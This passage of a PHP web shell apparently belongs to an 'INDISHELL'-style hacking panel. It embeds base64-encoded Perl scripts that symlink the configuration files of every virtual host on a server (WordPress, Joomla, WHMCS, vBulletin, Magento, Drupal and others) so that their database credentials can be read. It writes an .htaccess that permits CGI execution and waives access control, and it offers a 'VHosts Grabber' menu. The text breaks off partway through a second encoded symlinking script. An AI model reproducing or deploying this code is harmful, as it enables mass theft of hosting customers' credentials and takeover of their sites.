pbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25mLnBocCcsJHNpdGVzcy4nLTUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYWRtaW4vY29uZmlnLnBocCcsJHNpdGVzcy4nLTQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dQL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1wcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXdzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2cudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ibG9ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob21lL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcm90YWwvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1wcm90YWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdGVzdC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXRlc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCRzaXRlc3MuJy1pYnByb2FyY2FkZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1wcm90YWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1jbXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1zaXRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW5ld3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWhvbWUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXZifmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXZiM35jb25maWcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXZiMX5jb25maWcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRzaXRlc3MuJy12Ymx1dHRpbn5jbGFzc19jb3JlLnBocC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwMS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0xNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jZW50cmFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLWNlbnRyYWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1XSE1DUy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG1jL1dITS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobWMtV0hNLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUtd2htLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1wYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWhvc3RzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1Ym1pdHRpY2tldC5waHAnLCRzaXRlc3MuJy13aG1jczIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50ZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50c3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictYmlsbGluZy50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW1hbmFnZS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXkvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbXkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teXNob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC16ZW5jYXJ0LnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AtWkNzaG9wLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NtZi9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYyLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYtZm9ydW0udHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYtZm9ydW1zLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXVwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FydGljbGUvY29uZmlnLnBocCcsJHNpdGVzcy4nLU53YWh5LnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy91cC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZfZ2xvYmFsLnBocCcsJHNpdGVzcy4nLTYudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZS9kYi5waHAnLCRzaXRlc3MuJy03LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Nvbm5lY3QucGhwJywkc2l0ZXNzLictUEhQLUZ1c2lvbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ta19jb25mLnBocCcsJHNpdGVzcy4nLTkudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1EcnVwYWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVyL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictMW1lbWJlci50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictYmlsbGluZ3MudHh0JykgOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9yZXF1aXJlcy9jb25maWcucGhwJywkc2l0ZXNzLictQU00U1MtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWJpbGxpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZ3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0YmlsbGluY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxscy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0YmlsbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcHAvZXRjL2xvY2FsLnhtbCcsJHNpdGVzcy4nLU1hZ2VudG8udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYWRtaW4vY29uZmlnLnBocCcsJHNpdGVzcy4nLU9wZW5jYXJ0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwJywkc2l0ZXNzLictUHJlc3Rhc2hvcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcva29uZWtzaS5waHAnLCRzaXRlc3MuJy1Mb2tvbWVkaWEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbG9rb21lZGlhL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zbGNvbmZpZy5waHAnLCRzaXRlc3MuJy1TaXRlbG9jay50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcHBsaWNhdGlvbi9jb25maWcvZGF0YWJhc2UucGhwJywkc2l0ZXNzLictRWxsaXNsYWIudHh0Jyk7DQp9DQpwcmludCAiPGJyPjxicj48YnI+PGZvbnQgY29sb3I9cmVkPkRvbmUgISE8L2ZvbnQ+IjsNCg==';
$file = fopen("btbt.cin" ,"w+");
$write = fwrite ($file ,base64_decode($btm));
fclose($file);
    chmod("btbt.cin",0755);
   echo "<center><a href='btbt' target='_blank'>Click Here</a><br>open the btbt.cin</center>";
}

}
elseif($_GET['do'] == 'config') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=config2'>2nd Config</a> </li>";	
echo "<li> <a href='?dir=$dir&do=indi'>INDISHELL</a> </li>";	
echo "<li> <a href='?dir=$dir&do=vgrab'>VHosts Grabber</a> </li>";	
echo "</ul>";
echo "</center>";
			$idx = mkdir("btm_conf", 0777);
	$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
	$htc = fopen("btm_conf/.htaccess","w");
	fwrite($htc, $isi_htc);
	fclose($htc);
	if(preg_match("/vhosts|vhost/", $dir)) {
		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		$vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3